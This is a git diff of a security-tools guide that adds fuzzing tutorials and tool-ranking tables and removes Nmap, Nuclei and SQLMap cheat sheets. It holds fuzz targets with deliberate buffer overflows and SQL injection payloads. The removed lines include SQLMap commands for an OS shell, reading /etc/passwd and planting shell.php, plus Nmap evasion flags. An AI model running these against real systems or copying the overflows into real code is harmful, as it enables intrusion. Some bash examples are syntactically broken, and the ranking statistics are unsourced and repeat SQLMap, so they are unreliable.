+**Disadvantages:**
+❌ Requires source code or binary instrumentation
+❌ Slower than dumb fuzzing
+❌ More complex setup
 
 ---
 
-### LibFuzzer
+#### **Coverage-Guided Campaign: LibFuzzer Deep Dive**
 
-**Description:** LibFuzzer is an in-process, coverage-guided, evolutionary fuzzing engine that is part of the LLVM project, designed for fuzzing libraries and APIs.
+**How Coverage Guidance Works:**
 
-**Use Cases:**
-- Library fuzzing
-- API fuzzing
-- In-process fuzzing
-- Continuous integration fuzzing
-- Finding memory corruption bugs
+```
+Input → Execute → Measure Coverage → Did it find new paths?
+                                      ├─ Yes → Save to corpus
+                                      └─ No  → Discard
 
-**Installation:**
-
-```bash
-# Comes with Clang/LLVM
-# Install Clang
-sudo apt-get install clang
-
-# Verify LibFuzzer availability
-clang -v | grep libFuzzer
+Feedback Loop:
+  [Seed Inputs] → [Mutate] → [Execute] → [Coverage Data]
+                      ↑                        ↓
+                      └────── [New Paths?] ────┘
 ```
 
-**Basic Usage:**
+**Coverage Metrics:**
+- **Edge Coverage**: Which code branches were taken
+- **Path Coverage**: Which sequences of edges were taken
+- **Function Coverage**: Which functions were called
+- **Line Coverage**: Which source lines executed
+
+---
+
+#### **Complete LibFuzzer Coverage Campaign**
+
+**Step 1: Create Fuzz Target**
+
+```cpp
+// fuzz_target.cpp
+#include <stdint.h>
+#include <stddef.h>
+#include <string>
+#include <vector>
+
+// The function you want to test
+void VulnerableParser(const uint8_t *data, size_t size) {
+    if (size < 4) return;
+    
+    // Simulate complex logic
+    if (data[0] == 'F') {
+        if (data[1] == 'U') {
+            if (data[2] == 'Z') {
+                if (data[3] == 'Z') {
+                    // Deep path - potential vulnerability
+                    char buffer[10];
+                    memcpy(buffer, data + 4, size - 4); // Buffer overflow!
+                }
+            }
+        }
+    }
+}
+
+// LibFuzzer entry point
+extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
+    VulnerableParser(Data, Size);
+    return 0;
+}
+```
+
+**Step 2: Compile with Coverage Instrumentation**
 
 ```bash
-# Create fuzz target
-cat > fuzz_target.cpp << 'EOF'
+# Basic compilation with LibFuzzer
+clang++ -g -O1 -fsanitize=fuzzer fuzz_target.cpp -o fuzzer
+
+# With AddressSanitizer (detect memory bugs)
+clang++ -g -O1 -fsanitize=fuzzer,address fuzz_target.cpp -o fuzzer
+
+# With UndefinedBehaviorSanitizer
+clang++ -g -O1 -fsanitize=fuzzer,address,undefined fuzz_target.cpp -o fuzzer
+
+# With all sanitizers (recommended)
+clang++ -g -O1 -fsanitize=fuzzer,address,undefined,leak \
+    -fno-omit-frame-pointer fuzz_target.cpp -o fuzzer
+```
+
+**Step 3: Create Initial Corpus**
+
+```bash
+# Create corpus directory
+mkdir corpus
+
+# Add seed inputs (optional but recommended)
+echo "FUZZ" > corpus/seed1
+echo "TEST" > corpus/seed2
+echo "DATA" > corpus/seed3
+
+# Or start with empty corpus (LibFuzzer will generate)
+mkdir corpus
+```
+
+**Step 4: Run Coverage-Guided Fuzzing**
+
+```bash
+# Basic fuzzing
+./fuzzer corpus/
+
+# With options
+./fuzzer corpus/ \
+    -max_len=1024 \          # Maximum input length
+    -timeout=10 \            # Timeout per execution (seconds)
+    -workers=4 \             # Parallel workers
+    -jobs=1000 \             # Number of fuzzing jobs
+    -print_coverage=1        # Print coverage stats
+```
+
+**Step 5: Advanced Coverage Options**
+
+```bash
+# Focus on unexplored coverage
+./fuzzer corpus/ \
+    -focus_function=VulnerableParser \
+    -max_len=1024
+
+# Minimize corpus while maintaining coverage
+./fuzzer -merge=1 new_corpus/ corpus/
+
+# Run with detailed coverage output
+./fuzzer corpus/ \
+    -print_pcs=1 \           # Print covered PCs
+    -print_final_stats=1     # Final statistics
+```
+
+**Step 6: Structured Fuzzing with Hints**
+
+```cpp
+// Advanced fuzz target with coverage hints
 #include <stdint.h>
 #include <stddef.h>
 
 extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
-  // Your code to test
-  if (Size > 0 && Data[0] == 'H') {
-    if (Size > 1 && Data[1] == 'I') {
-      if (Size > 2 && Data[2] == '!') {
-        __builtin_trap(); // Simulate crash
-      }
+    if (Size < 8) return 0;
+    
+    // Use libFuzzer's compare hints for faster discovery
+    if (__builtin_memcmp(Data, "MAGIC123", 8) == 0) {
+        // This path will be discovered faster with memcmp instrumentation
+        if (Size > 100) {
+            // Deep vulnerability
+            char buf[10];
+            memcpy(buf, Data + 8, Size - 8);
+        }
     }
-  }
-  return 0;
+    
+    return 0;
 }
-EOF
-
-# Compile with LibFuzzer
-clang++ -g -O1 -fsanitize=fuzzer,address fuzz_target.cpp -o fuzz_target
-
-# Run fuzzer
-./fuzz_target
-
-# With corpus directory
-./fuzz_target corpus/
-
-# With dictionary
-./fuzz_target -dict=dict.txt corpus/
 ```
 
-**Advanced Examples:**
+**Compile with comparison instrumentation:**
+```bash
+clang++ -g -O1 -fsanitize=fuzzer,address \
+    -fsanitize-coverage=trace-cmp \
+    fuzz_target.cpp -o fuzzer
+```
+
+**Step 7: Continuous Fuzzing Campaign**
 
 ```bash
-# Minimize corpus
-./fuzz_target -merge=1 minimized_corpus/ corpus/
+# Run for 24 hours
+./fuzzer corpus/ -max_total_time=86400
 
-# Run with timeout
-./fuzz_target -timeout=5
+# Run until finding N crashes
+./fuzzer corpus/ -runs=1000000
 
-# Maximum input length
-./fuzz_target -max_len=1024
+# Distributed fuzzing on multiple machines
+# Machine 1:
+./fuzzer -fork=8 corpus/
 
-# Number of runs
-./fuzz_target -runs=1000000
-
-# Use multiple workers
-./fuzz_target -workers=8 -jobs=8
-
-# With sanitizers
-clang++ -g -O1 -fsanitize=fuzzer,address,undefined fuzz_target.cpp -o fuzz_target
-
-# Continuous fuzzing with coverage
-./fuzz_target -print_coverage=1 corpus/
+# Machine 2:
+./fuzzer -fork=8 corpus/  # Share corpus via network drive
 ```
 
-**Integration with Workflow Automation:**
+**Step 8: Analyze Coverage**
+
+```bash
+# Generate coverage report
+clang++ -g -O1 -fsanitize=fuzzer,address \
+    -fprofile-instr-generate -fcoverage-mapping \
+    fuzz_target.cpp -o fuzzer_cov
+
+# Run with coverage
+LLVM_PROFILE_FILE="coverage.profraw" ./fuzzer_cov corpus/ -runs=10000
+
+# Convert to readable format
+llvm-profdata merge -sparse coverage.profraw -o coverage.profdata
+
+# Generate HTML coverage report
+llvm-cov show ./fuzzer_cov -instr-profile=coverage.profdata \
+    -format=html > coverage.html
+
+# View in browser
+firefox coverage.html
+```
+
+---
+
+### **3. Grammar-Based Fuzzing**
+
+**Description:** Uses formal grammars or specifications to generate valid, well-formed inputs. Ideal for structured data formats and programming languages.
+
+**Best Tools:**
+- **Custom Grammar Generators** (Python-based)
+- **Grammarinator** ⭐⭐⭐
+- **Nautilus** ⭐⭐⭐
+
+**When to Use:**
+- Known input grammar/specification
+- Testing parsers and compilers
+- Protocol fuzzing with specs
+- Structured formats (JSON, XML, SQL)
+- Language interpreters
+
+**Advantages:**
+✅ Generates mostly valid inputs
+✅ Bypasses simple validation
+✅ Tests deeper logic
+✅ Better coverage of valid states
+✅ Efficient for complex formats
+
+**Disadvantages:**
+❌ Requires grammar specification
+❌ May miss edge cases outside grammar
+❌ More complex to set up
+❌ Can be slower
+
+---
+
+#### **Grammar-Based Campaign: Complete Guide**
+
+**Example 1: JSON Grammar Fuzzing**
+
+**Step 1: Define Grammar (ANTLR Format)**
+
+```antlr
+// json.g4
+grammar JSON;
+
+json
+   : value
+   ;
+
+object
+   : '{' pair (',' pair)* '}'
+   | '{' '}'
+   ;
+
+pair
+   : STRING ':' value
+   ;
+
+array
+   : '[' value (',' value)* ']'
+   | '[' ']'
+   ;
+
+value
+   : STRING
+   | NUMBER
+   | object
+   | array
+   | 'true'
+   | 'false'
+   | 'null'
+   ;
+
+STRING
+   : '"' (ESC | ~["\\])* '"'
+   ;
+
+fragment ESC
+   : '\\' ["\\/bfnrt]
+   | '\\u' HEX HEX HEX HEX
+   ;
+
+fragment HEX
+   : [0-9a-fA-F]
+   ;
+
+NUMBER
+   : '-'? INT ('.' [0-9]+)? EXP?
+   ;
+
+fragment INT
+   : '0' | [1-9] [0-9]*
+   ;
+
+fragment EXP
+   : [Ee] [+\-]? INT
+   ;
+
+WS
+   : [ \t\n\r]+ -> skip
+   ;
+```
+
+**Step 2: Generate Fuzzer with Grammarinator**
+
+```bash
+# Install Grammarinator
+pip install grammarinator
+
+# Generate fuzzer from grammar
+grammarinator-process json.g4 -o json_fuzzer/
+
+# Generate test cases
+grammarinator-generate -r json \
+    -d 10 \                     # Max depth
+    -n 1000 \                   # Number of tests
+    -o json_tests/ \
+    json_fuzzer.JSONGenerator
+```
+
+**Step 3: Use Generated Inputs**
+
+```bash
+# Feed to your JSON parser
+for test in json_tests/*.json; do
+    ./json_parser "$test"
+done
+
+# Or integrate with AFL++
+mkdir grammar_seeds
+cp json_tests/*.json grammar_seeds/
+afl-fuzz -i grammar_seeds/ -o findings/ -- ./json_parser @@
+```
+
+---
+
+**Example 2: SQL Grammar Fuzzing**
+
+**Step 1: Define SQL Grammar**
 
 ```python
-scanner_commands = {
-    "LibFuzzer Campaign": r'./fuzz_target -max_total_time=3600 -workers=4 "C:\payloads\libfuzzer-corpus"',
-}
+# sql_grammar.py
+import random
+
+class SQLGrammarFuzzer:
+    def __init__(self):
+        self.grammar = {
+            '<start>': ['<statement>'],
+            '<statement>': [
+                '<select>',
+                '<insert>',
+                '<update>',
+                '<delete>'
+            ],
+            '<select>': [
+                'SELECT <columns> FROM <table> <where>',
+                'SELECT <columns> FROM <table>'
+            ],
+            '<insert>': [
+                'INSERT INTO <table> VALUES <values>'
+            ],
+            '<update>': [
+                'UPDATE <table> SET <assignments> <where>'
+            ],
+            '<delete>': [
+                'DELETE FROM <table> <where>'
+            ],
+            '<columns>': [
+                '*',
+                '<column>',
+                '<column>, <columns>'
+            ],
+            '<column>': [
+                'id',
+                'name',
+                'email',
+                'password'
+            ],
+            '<table>': [
+                'users',
+                'products',
+                'orders'
+            ],
+            '<where>': [
+                '',
+                'WHERE <condition>'
+            ],
+            '<condition>': [
+                '<column> = <value>',
+                '<column> > <value>',
+                '<column> < <value>',
+                '<condition> AND <condition>',
+                '<condition> OR <condition>'
+            ],
+            '<value>': [
+                '1',
+                "'test'",
+                "'admin' OR '1'='1'",  # SQL injection payload
+                "'; DROP TABLE users--"
+            ],
+            '<values>': [
+                '(<value>)',
+                '(<value>, <values>)'
+            ],
+            '<assignments>': [
+                '<column> = <value>',
+                '<column> = <value>, <assignments>'
+            ]
+        }
+    
+    def generate(self, symbol='<start>', depth=0, max_depth=10):
+        if depth > max_depth:
+            return ""
+        
+        if symbol not in self.grammar:
+            return symbol
+        
+        expansion = random.choice(self.grammar[symbol])
+        result = ""
+        
+        for part in expansion.split():
+            if part.startswith('<'):
+                result += self.generate(part, depth + 1, max_depth) + " "
+            else:
+                result += part + " "
+        
+        return result.strip()
+
+# Usage
+fuzzer = SQLGrammarFuzzer()
+for i in range(100):
+    query = fuzzer.generate()
+    print(f"Test {i}: {query}")
+    # Send to SQL parser for testing
+```
+
+**Step 2: Integration with Coverage Fuzzing**
+
+```bash
+# Generate seed corpus
+python sql_grammar.py > grammar_seeds.txt
+
+# Use with AFL++
+mkdir sql_seeds
+split -l 1 grammar_seeds.txt sql_seeds/seed_
+
+# Compile SQL parser with instrumentation
+afl-clang-fast -o sql_parser sql_parser.c
+
+# Run fuzzing with grammar seeds
+afl-fuzz -i sql_seeds/ -o findings/ -- ./sql_parser @@
 ```
 
 ---
 
-### Nmap
+**Example 3: XML Grammar Fuzzing**
 
-**Description:** Nmap (Network Mapper) is a free and open-source network scanner used for network discovery, security auditing, and port scanning.
-
-**Use Cases:**
-- Network discovery
-- Port scanning
-- Service/version detection
-- OS detection
-- Vulnerability scanning with NSE scripts
-
-**Installation:**
-
-```bash
-# Linux (Ubuntu/Debian)
-sudo apt-get install nmap
-
-# macOS
-brew install nmap
-
-# Windows
-# Download from https://nmap.org/download.html
-
-# Verify installation
-nmap --version
-```
-
-**Basic Usage:**
-
-```bash
-# Basic port scan
-nmap target.com
-
-# Scan specific ports
-nmap -p 80,443 target.com
-
-# Scan port range
-nmap -p 1-1000 target.com
-
-# Scan all ports
-nmap -p- target.com
-
-# Service version detection
-nmap -sV target.com
-
-# OS detection
-nmap -O target.com
-
-# Aggressive scan (OS, version, scripts, traceroute)
-nmap -A target.com
-```
-
-**Advanced Examples:**
-
-```bash
-# TCP SYN scan (stealth scan)
-sudo nmap -sS target.com
-
-# UDP scan
-sudo nmap -sU target.com
-
-# Fast scan (top 100 ports)
-nmap -F target.com
-
-# Scan from file
-nmap -iL targets.txt
-
-# Output formats
-nmap -oN output.txt target.com  # Normal
-nmap -oX output.xml target.com  # XML
-nmap -oG output.gnmap target.com  # Grepable
-nmap -oA output target.com  # All formats
-
-# NSE scripts (vulnerability scanning)
-nmap --script vuln target.com
-nmap --script http-sql-injection target.com
-nmap --script ssl-cert,ssl-enum-ciphers target.com
-
-# DNS brute-force
-nmap --script dns-brute target.com
-
-# With custom wordlist
-nmap --script dns-brute --script-args dns-brute.hostlist=wordlist.txt target.com
-
-# Rate limiting
-nmap --max-rate 10 target.com
-nmap --scan-delay 1s target.com
-
-# Timing templates
-nmap -T0 target.com  # Paranoid (slowest)
-nmap -T3 target.com  # Normal (default)
-nmap -T5 target.com  # Insane (fastest)
-
-# Evade firewalls
-nmap -f target.com  # Fragment packets
-nmap -D RND:10 target.com  # Decoy scans
-nmap --source-port 53 target.com  # Spoof source port
-
-# IPv6 scanning
-nmap -6 target.com
-```
-
-**Integration with Workflow Automation:**
+**Step 1: Simple XML Grammar Generator**
 
 ```python
-scanner_commands = {
-    "Nmap Full Port Scan": r'nmap -p 1-65535 --open --max-rate 5/s -iL "C:\output\domain_output.txt" -oA "C:\output\nmap-full"',
+# xml_fuzzer.py
+import random
+
+class XMLFuzzer:
+    def __init__(self):
+        self.tags = ["root", "child", "data", "item", "element"]
+        self.attributes = ["id", "name", "value", "type", "class"]
+        
+    def generate_element(self, depth=0, max_depth=5):
+        if depth >= max_depth:
+            return random.choice(["text", "123", "data"])
+        
+        tag = random.choice(self.tags)
+        attrs = ""
+        
+        # Add random attributes
+        if random.random() > 0.5:
+            num_attrs = random.randint(0, 3)
+            attr_list = []
+            for _ in range(num_attrs):
+                attr_name = random.choice(self.attributes)
+                attr_value = f"value_{random.randint(1, 100)}"
+                attr_list.append(f'{attr_name}="{attr_value}"')
+            if attr_list:
+                attrs = " " + " ".join(attr_list)
+        
+        # Self-closing or with content
+        if random.random() > 0.3:
+            # With content
+            content = ""
+            num_children = random.randint(0, 3)
+            for _ in range(num_children):
+                content += self.generate_element(depth + 1, max_depth)
+            return f"<{tag}{attrs}>{content}</{tag}>"
+        else:
+            # Self-closing
+            return f"<{tag}{attrs}/>"
     
-    "Nmap Service Detection": r'nmap -sV -sC -p- --open -iL "C:\output\domain_output.txt" -oA "C:\output\nmap-services"',
-    
-    "Nmap Vulnerability Scan": r'nmap --script vuln -iL "C:\output\domain_output.txt" -oN "C:\output\nmap-vulns.txt"',
-    
-    "Nmap DNS Bruteforce": r'nmap --script dns-brute --script-args "dns-brute.hostlist=C:\payloads\dns\subdomains-10000.txt" target.com',
-}
+    def generate(self):
+        xml = '<?xml version="1.0"?>\n'
+        xml += self.generate_element()
+        return xml
+
+# Generate test cases
+fuzzer = XMLFuzzer()
+for i in range(100):
+    test = fuzzer.generate()
+    with open(f"xml_tests/test_{i}.xml", "w") as f:
+        f.write(test)
 ```
 
 ---
 
-### Nuclei
+### **Fuzzing Campaign Comparison**
 
-**Description:** Nuclei is a fast and customizable vulnerability scanner based on simple YAML-based templates, enabling you to scan for a wide range of security issues across technologies.
+| Aspect | Mutation-Based | Coverage-Guided | Grammar-Based |
+|--------|---------------|-----------------|---------------|
+| **Setup Time** | Fast ⚡⚡⚡ | Medium ⚡⚡ | Slow ⚡ |
+| **Code Coverage** | Low-Medium | High ⭐⭐⭐⭐⭐ | Medium-High |
+| **Valid Inputs** | Low | Medium | High ⭐⭐⭐⭐⭐ |
+| **Speed** | Fast ⚡⚡⚡ | Medium ⚡⚡ | Slow ⚡ |
+| **Deep Bugs** | Medium | High ⭐⭐⭐⭐⭐ | High ⭐⭐⭐⭐ |
+| **Source Needed** | No ✅ | Yes ❌ | No ✅ |
+| **Grammar Needed** | No ✅ | No ✅ | Yes ❌ |
+| **Best For** | Unknown formats | Security testing | Parsers/Protocols |
 
-**Use Cases:**
-- Automated vulnerability scanning
-- CVE detection
-- Misconfiguration discovery
-- Exposed panel detection
-- Continuous security monitoring
-- CI/CD integration
+---
 
-**Installation:**
+### **Recommended Fuzzing Strategy**
 
+**For Most Projects:**
 ```bash
-# Using go install
-go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-
-# Using brew (macOS)
-brew install nuclei
-
-# Pre-compiled binaries
-# Download from https://github.com/projectdiscovery/nuclei/releases
-
-# Verify installation
-nuclei -version
-
-# Update templates
-nuclei -update-templates
+# Start with coverage-guided (LibFuzzer or AFL++)
+1. Set up AFL++ or LibFuzzer
+2. Create seed corpus from valid inputs
+3. Run coverage-guided fuzzing
+4. Monitor for crashes and hangs
+5. Triage and fix bugs
+6. Repeat
 ```
 
-**Basic Usage:**
-
+**For Complex Structured Formats:**
 ```bash
-# Scan single URL
-nuclei -u https://target.com
-
-# Scan multiple URLs from file
-nuclei -l urls.txt
-
-# Scan with specific templates
-nuclei -u https://target.com -t cves/
-
-# Scan with severity filter
-nuclei -u https://target.com -severity critical,high
-
-# Output to file
-nuclei -u https://target.com -o results.txt
+# Combine grammar-based with coverage-guided
+1. Define grammar for your format
+2. Generate seed corpus from grammar
+3. Feed grammar seeds to AFL++ or LibFuzzer
+4. Get both valid structure AND coverage guidance
+5. Best of both worlds!
 ```
 
-**Advanced Examples:**
-
+**Hybrid Approach (Recommended):**
 ```bash
-# Scan with specific tags
-nuclei -u https://target.com -tags cve,oob,ssrf
-
-# Scan with template directory
-nuclei -u https://target.com -t /path/to/templates/
-
-# Multiple targets
-nuclei -l targets.txt -t cves/ -o results.txt
-
-# Exclude specific templates
-nuclei -u https://target.com -t cves/ -exclude-templates cves/2020/
-
-# Rate limiting
-nuclei -u https://target.com -rate-limit 10
-
-# Bulk header
-nuclei -l urls.txt -H "Authorization: Bearer token123"
-
-# Retries
-nuclei -u https://target.com -retries 3
-
-# Timeout
-nuclei -u https://target.com -timeout 10
-
-# JSON output
-nuclei -u https://target.com -json -o results.json
-
-# Markdown report
-nuclei -u https://target.com -markdown-export report.md
-
-# SARIF output (for GitHub)
-nuclei -u https://target.com -sarif-export results.sarif
-
-# Silent mode (only show findings)
-nuclei -u https://target.com -silent
-
-# Verbose mode
-nuclei -u https://target.com -v
-
-# Debug mode
-nuclei -u https://target.com -debug
-
-# Scan with multiple severity levels
-nuclei -u https://target.com -severity critical,high,medium
-
-# Scan specific protocols
-nuclei -u https://target.com -t http/
-
-# Scan for exposed panels
-nuclei -u https://target.com -tags panel
-
-# Scan for default credentials
-nuclei -u https://target.com -tags default-login
-
-# Scan with custom headers
-nuclei -u https://target.com -H "Cookie: session=abc123" -H "User-Agent: Custom"
-
-# Scan with proxy
-nuclei -u https://target.com -proxy-url http://127.0.0.1:8080
-
-# Automatic template execution
-nuclei -u https://target.com -automatic-scan
-
-# Resume scan
-nuclei -l urls.txt -resume resume.cfg
-
-# Statistics
-nuclei -u https://target.com -stats
-
-# Scan with webhooks (Slack/Discord)
-nuclei -u https://target.com -webhook-url https://hooks.slack.com/services/YOUR/WEBHOOK/URL
-
-# Interactsh integration for OOB detection
-nuclei -u https://target.com -interactions
-```
-
-**Template Categories:**
-
-```bash
-# CVE templates
-nuclei -u https://target.com -t cves/
-
-# Exposed panels
-nuclei -u https://target.com -t exposed-panels/
-
-# Misconfigurations
-nuclei -u https://target.com -t misconfigurations/
-
-# Default credentials
-nuclei -u https://target.com -t default-logins/
-
-# DNS templates
-nuclei -u https://target.com -t dns/
-
-# Fuzzing templates
-nuclei -u https://target.com -t fuzzing/
-
-# Technologies
-nuclei -u https://target.com -t technologies/
-
-# Takeovers
-nuclei -u https://target.com -t takeovers/
-
-# WordPress
-nuclei -u https://target.com -t wordpress/
-
-# Joomla
-nuclei -u https://target.com -t joomla/
-```
-
-**Custom Template Example:**
-
-```yaml
-# custom-xss-check.yaml
-id: custom-xss-check
-
-info:
-  name: Custom XSS Detection
-  author: yourname
-  severity: high
-  description: Detects reflected XSS vulnerabilities
-  tags: xss,custom
-
-requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/search?q={{randstr}}"
-    
-    matchers:
-      - type: word
-        words:
-          - "{{randstr}}"
-        part: body
-      
-      - type: word
-        words:
-          - "text/html"
-        part: header
-```
-
-**Running Custom Template:**
-
-```bash
-nuclei -u https://target.com -t custom-xss-check.yaml
-```
-
-**Integration with Workflow Automation:**
-
-```python
-scanner_commands = {
-    "Nuclei CVE Scan": r'nuclei -l "C:\output\domain_output.txt" -t cves/ -severity critical,high -o "C:\output\nuclei-cves.txt"',
-    
-    "Nuclei Full Scan": r'nuclei -l "C:\output\domain_output.txt" -t nuclei-templates/ -o "C:\output\nuclei-full.txt"',
-    
-    "Nuclei Exposed Panels": r'nuclei -l "C:\output\domain_output.txt" -t exposed-panels/ -o "C:\output\nuclei-panels.txt"',
-    
-    "Nuclei Misconfigurations": r'nuclei -l "C:\output\domain_output.txt" -t misconfigurations/ -o "C:\output\nuclei-misconfig.txt"',
-    
-    "Nuclei JSON Output": r'nuclei -l "C:\output\domain_output.txt" -t cves/ -json -o "C:\output\nuclei-results.json"',
-    
-    "Nuclei with Interactsh": r'nuclei -l "C:\output\domain_output.txt" -t cves/ -interactions -o "C:\output\nuclei-oob.txt"',
-}
-```
-
-**Nuclei Template Repositories:**
-
-```bash
-# Official templates (auto-updated)
-nuclei -update-templates
-
-# Custom template repositories
-nuclei -u https://target.com -t https://github.com/your-org/custom-templates
-
-# Local custom templates
-nuclei -u https://target.com -t /path/to/custom/templates/
+# Use all three together!
+Phase 1: Grammar-based seed generation (1000 inputs)
+Phase 2: Coverage-guided fuzzing with grammar seeds (24 hours)
+Phase 3: Mutation-based on discovered corpus (ongoing)
 ```
 
 ---
 
-### SQLMap
+## 🏆 Top 50 Most In-Demand Tools
 
-**Description:** SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities.
+**Based on frequency in job postings:**
 
-**Use Cases:**
-- SQL injection detection
-- Database fingerprinting
-- Data extraction
-- Database takeover
-- File system access via SQL injection
-
-**Installation:**
-
-```bash
-# Linux (Ubuntu/Debian)
-sudo apt-get install sqlmap
-
-# Using pip
-pip install sqlmap
-
-# From source
-git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
-cd sqlmap-dev
-python sqlmap.py
-
-# Verify installation
-sqlmap --version
-```
-
-**Basic Usage:**
-
-```bash
-# Basic SQL injection test
-sqlmap -u "http://target.com/page?id=1"
-
-# POST request
-sqlmap -u "http://target.com/login" --data="username=admin&password=test"
-
-# With cookie
-sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
-
-# Test specific parameter
-sqlmap -u "http://target.com/page?id=1&name=test" -p id
-
-# Enumerate databases
-sqlmap -u "http://target.com/page?id=1" --dbs
-
-# Enumerate tables
-sqlmap -u "http://target.com/page?id=1" -D database_name --tables
-
-# Dump table data
-sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump
-
-# Get current user
-sqlmap -u "http://target.com/page?id=1" --current-user
-
-# Get current database
-sqlmap -u "http://target.com/page?id=1" --current-db
-```
-
-**Advanced Examples:**
-
-```bash
-# Batch mode (non-interactive)
-sqlmap -u "http://target.com/page?id=1" --batch
-
-# Risk and level
-sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5
-
-# Through proxy (Burp Suite)
-sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
-
-# From Burp request file
-sqlmap -r request.txt
-
-# Tamper scripts (WAF bypass)
-sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
-
-# Multiple tamper scripts
-sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase,space2comment
-
-# OS shell access
-sqlmap -u "http://target.com/page?id=1" --os-shell
-
-# Read file
-sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
-
-# Write file
-sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
-
-# Crawl website and test all forms
-sqlmap -u "http://target.com" --crawl=3 --batch
-
-# Mobile user-agent
-sqlmap -u "http://target.com/page?id=1" --mobile
-
-# Random user-agent
-sqlmap -u "http://target.com/page?id=1" --random-agent
-
-# Custom user-agent
-sqlmap -u "http://target.com/page?id=1" --user-agent="Custom Agent"
-
-# Threads for faster execution
-sqlmap -u "http://target.com/page?id=1" --threads=10
-
-# Specify DBMS
-sqlmap -u "http://target.com/page?id=1" --dbms=mysql
-
-# Technique specification
-sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ
-# B: Boolean-based blind
-# E: Error-based
-# U: Union query-based
-# S: Stacked queries
-# T: Time-based blind
-# Q: Inline queries
-```
-
-**Integration with Workflow Automation:**
-
-```python
-scanner_commands = {
-    "SQLMap Basic Test": r'sqlmap -u "https://target.com/product?id=1" --batch --risk=3 --level=5 -o "C:\output\sqlmap_basic.txt"',
-    
-    "SQLMap via Burp": r'sqlmap -u "https://target.com/product?id=1" --proxy="http://127.0.0.1:8080" --batch -o "C:\output\sqlmap_burp.txt"',
-    
-    "SQLMap Database Enumeration": r'sqlmap -u "https://target.com/product?id=1" --batch --dbs -o "C:\output\sqlmap_dbs.txt"',
-    
-    "SQLMap Crawl and Test": r'sqlmap -u "https://target.com" --crawl=2 --batch --forms -o "C:\output\sqlmap_crawl.txt"',
-}
-```
+| Rank | Tool | Mentioned In | Category |
+|------|------|--------------|----------|
+| 1 | Burp Suite Professional | 95% | Web Security |
+| 2 | Nmap | 90% | Network Scanning |
+| 3 | Metasploit | 75% | Exploitation/C2 |
+| 4 | Postman | 70% | API Testing |
+| 5 | Windows | 68% | Operating System |
+| 6 | OWASP ZAP | 60% | Web Security |
+| 7 | Nuclei | 55% | Vulnerability Scanning |
+| 8 | Wireshark | 50% | Network Analysis |
+| 9 | SQLMap | 50% | SQL Injection |
+| 10 | VirtualBox | 48% | Virtualization |
+| 11 | Nessus | 45% | Vulnerability Scanning |
+| 12 | Kali Linux | 44% | Operating System |
+| 13 | Frida | 42% | Mobile/Dynamic Analysis |
+| 14 | Ffuf | 40% | Directory Discovery |
+| 15 | Amass | 40% | Subdomain Enum |
+| 16 | Ghidra | 38% | Reverse Engineering |
+| 17 | Subfinder | 35% | Subdomain Enum |
+| 18 | Android Studio | 32% | Mobile Development |
+| 19 | Snyk | 30% | Dependency Scanning |
+| 20 | Gobuster | 30% | Directory Discovery |
+| 21 | JADX | 28% | Android RE |
+| 22 | APKTool | 28% | Android RE |
+| 23 | ADB | 27% | Mobile Testing |
+| 24 | Prowler | 25% | Cloud Security |
+| 25 | Trivy | 25% | Container Security |
+| 26 | AFL++ | 22% | Fuzzing |
+| 27 | Katana | 20% | Web Crawling |
+| 28 | Kiterunner | 20% | API Discovery |
+| 29 | IDA Pro | 18% | Reverse Engineering |
+| 30 | Sliver | 15% | C2 Framework |
+| 31 | ScoutSuite | 14% | Cloud Security |
+| 32 | MobSF | 14% | Mobile Security |
+| 33 | LibFuzzer | 13% | Fuzzing |
+| 34 | Arjun | 12% | Parameter Discovery |
+| 35 | GAU | 12% | Web Crawling |
+| 36 | LinkFinder | 11% | JS Analysis |
+| 37 | SQLMap | 11% | SQL Injection |
+| 38 | Interactsh | 10% | OOB Testing |
+| 39 | Checkmarx | 10% | SAST |
+| 40 | Radare2 | 9% | Reverse Engineering |
+| 41 | Honggfuzz | 9% | Fuzzing |
+| 42 | kube-bench | 8% | K8s Security |
+| 43 | Feroxbuster | 8% | Directory Discovery |
+| 44 | Drozer | 7% | Mobile Security |
+| 45 | InQL | 7% | GraphQL Testing |
+| 46 | Retire.js | 7% | JS Vuln Scanning |
+| 47 | dex2jar | 6% | Android RE |
+| 48 | Merlin | 6% | C2 Framework |
+| 49 | CloudSploit | 6% | Cloud Security |
+| 50 | XSSHunter | 5% | XSS Detection |
 
 ---
 
-### Wireshark
+## 💼 Tools by Company Type
 
-**Description:** Wireshark is the world's most popular network protocol analyzer, allowing you to capture and interactively browse network traffic.
+### **FAANG (Google, Meta, Amazon, Apple, Netflix)**
+**Focus:** Scale, automation, cloud-native, fuzzing
 
-**Use Cases:**
-- Network troubleshooting
-- Security analysis
-- Protocol development
-- Traffic analysis
-- Malware analysis
+**Primary Tools:**
+- Burp Suite Professional
+- Nuclei (with custom templates)
+- Prowler/ScoutSuite
+- Snyk/Trivy
+- AFL++/LibFuzzer (security research)
+- Metasploit
+- Nmap
+- Frida (mobile)
+- Ghidra (reverse engineering)
+- Windows + VirtualBox (testing environment)
 
-**Installation:**
+### **Fintech (Stripe, Coinbase, Square, PayPal)**
+**Focus:** API security, compliance, data protection
 
-```bash
-# Linux (Ubuntu/Debian)
-sudo apt-get install wireshark
+**Primary Tools:**
+- Burp Suite Professional
+- Postman
+- Kiterunner
+- Nuclei
+- Prowler
+- Trivy
+- Snyk
+- Checkmarx
+- Windows (enterprise environment)
 
-# Add user to wireshark group (optional, for non-root capture)
-sudo usermod -aG wireshark $USER
-# Log out and back in
+### **Mobile Companies (Uber, Lyft, DoorDash)**
+**Focus:** Mobile app security, APIs
 
-# macOS
-brew install wireshark
+**Primary Tools:**
+- Android Studio
+- ADB
+- JADX
+- APKTool
+- Frida
